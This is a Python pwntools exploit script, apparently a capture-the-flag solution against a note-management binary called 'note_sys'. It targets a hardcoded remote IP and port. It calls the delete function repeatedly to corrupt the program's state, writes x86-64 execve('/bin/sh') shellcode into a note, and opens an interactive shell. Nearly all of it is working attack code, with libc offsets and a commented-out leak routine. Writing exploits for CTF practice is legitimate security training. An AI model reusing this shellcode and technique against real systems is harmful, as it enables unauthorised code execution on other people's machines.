import time, sys
from pwn import *

# local process envirnoment
LOCAL = False
elf_name = "./note_sys"

#retmote args
remote_host = "118.31.18.29"
remote_port = 20003
context.clear(arch="amd64")
elf = ELF(elf_name)


if LOCAL:
    smlbin_area_off = 0x3C3B78
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    #context.log_level = "debug"
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    printf_off = 0x4CDD0
    system_off = 0x3FE70
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.01)

def mmenu(opt):
    io.recvuntil("choice:")
    io.sendline(str(opt))

def add_note(mcontent):
    mmenu(0)
    io.recvuntil("no more than 250 characters")
    dlySend(mcontent)

def show_note():
    mmenu(1)

def delete_note():
    mmenu(2)

def exit_rnote():
    mmenu(3)

def s_leak():

    shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    '''
    for i in range(2):
        delete_note()
    for i in range(1):
        padding = chr(ord('a')+i)*0x08+'\n'
        add_note(padding)
    show_note()
    io.recvuntil("the total of notes is ")
    data = int(io.recvline()[:-1])
    log.info(hex(data))
    for i in range(1):
        delete_note()
    for i in range(1):
        padding = chr(ord('a')+i)*0x08+'\n'
        add_note(padding)
    show_note()
    io.recvuntil("the total of notes is ")
    data = int(io.recvline()[:-1])
    log.info(hex(data))
    '''
    for i in range(12):
        delete_note()
    for i in range(1):
        add_note(shellcode+'\n')

    time.sleep(2)
    delete_note()
    io.interactive()
    #return libc_base_addr

def s_exp():
    libc_base_addr = s_leak()
    # io.interactive()

if __name__ == "__main__":
    s_exp()
    pause()
